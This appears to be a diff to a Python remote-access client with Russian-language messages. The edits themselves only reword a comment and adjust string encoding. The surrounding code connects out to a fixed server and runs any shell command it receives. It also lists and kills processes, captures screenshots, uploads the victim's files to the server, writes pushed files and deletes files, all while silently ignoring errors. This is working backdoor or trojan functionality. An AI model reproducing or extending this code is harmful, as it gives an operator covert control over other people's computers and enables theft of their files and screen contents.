@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Замените на IP вашего сервера
+SERVER_IP = "192.168.100.3"  # Замените на IP своего сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -175,10 +175,12 @@ def main():
                         # Фоновый запуск без ожидания
                         cmd_no_amp = cmd.rstrip('&').strip()
                         try:
-                            subprocess.Popen(cmd_no_amp, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                            s.send(b"Команда выполнена в фоне")
+                            subprocess.Popen(cmd_no_amp, shell=True,
+                                             stdout=subprocess.DEVNULL,
+                                             stderr=subprocess.DEVNULL)
+                            s.send("Команда выполнена в фоне".encode())
                         except Exception as e:
-                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode(errors='ignore'))
+                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode())
                         continue
 
                     if cmd.startswith("cd"):
@@ -188,9 +190,9 @@ def main():
                         try:
                             os.chdir(path)
                             current_dir = os.getcwd()
-                            s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
+                            s.send(f"Сменена директория на {current_dir}".encode())
                         except Exception as e:
-                            s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
+                            s.send(f"Ошибка смены директории: {e}".encode())
 
                     elif cmd.startswith("ls"):
                         path = cmd[2:].strip()
@@ -207,20 +209,20 @@ def main():
                                 else:
                                     files.append(e)
                             result = "\n".join(sorted(dirs) + sorted(files))
-                            s.send(result.encode(errors='ignore'))
+                            s.send(result.encode())
                         except Exception:
-                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode(errors='ignore'))
+                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode())
 
                     else:
                         output = execute_command(cmd)
-                        s.send(output.encode(errors='ignore'))
+                        s.send(output.encode())
 
                 elif command == "process_list":
                     if is_windows():
                         procs = subprocess.getoutput('tasklist')
                     else:
                         procs = subprocess.getoutput('ps aux')
-                    s.send(procs.encode(errors='ignore'))
+                    s.send(procs.encode())
 
                 elif command.startswith("kill:"):
                     pid = command[5:]
@@ -229,9 +231,9 @@ def main():
                             subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                         else:
                             subprocess.check_output(f'kill -9 {pid}', shell=True)
-                        s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
+                        s.send(f"Процесс {pid} завершён.".encode())
                     except Exception as e:
-                        s.send(f"Ошибка: {e}".encode(errors='ignore'))
+                        s.send(f"Ошибка: {e}".encode())
 
                 elif command == "screenshot":
                     try:
@@ -246,7 +248,7 @@ def main():
                                 s.sendall(chunk)
                         os.remove("screen.jpg")
                     except Exception as e:
-                        s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
+                        s.send(f"Ошибка снятия скриншота: {e}".encode())
 
                 elif command.startswith("download:"):
                     filepath = command[len("download:"):].strip()
@@ -261,7 +263,7 @@ def main():
                                 s.sendall(chunk)
                     except Exception as e:
                         error_msg = f"Ошибка при чтении файла: {e}"
-                        err_bytes = error_msg.encode(errors='ignore')
+                        err_bytes = error_msg.encode()
                         s.sendall(len(err_bytes).to_bytes(8, byteorder='big'))
                         s.sendall(err_bytes)
 
@@ -274,20 +276,20 @@ def main():
                                 if chunk == b"__file_transfer_end__" or not chunk:
                                     break
                                 f.write(chunk)
-                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode(errors='ignore'))
+                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode())
                     except Exception as e:
-                        s.send(f"Ошибка при сохранении файла: {e}".encode(errors='ignore'))
+                        s.send(f"Ошибка при сохранении файла: {e}".encode())
 
                 elif command.startswith("delete:"):
                     filepath = command[len("delete:"):].strip()
                     try:
                         os.remove(filepath)
-                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode(errors='ignore'))
+                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode())
                     except Exception as e:
-                        s.send(f"Ошибка удаления файла: {e}".encode(errors='ignore'))
+                        s.send(f"Ошибка удаления файла: {e}".encode())
 
                 else:
-                    s.send("Неизвестная команда".encode(errors='ignore'))
+                    s.send("Неизвестная команда".encode())
 
         except Exception:
             pass
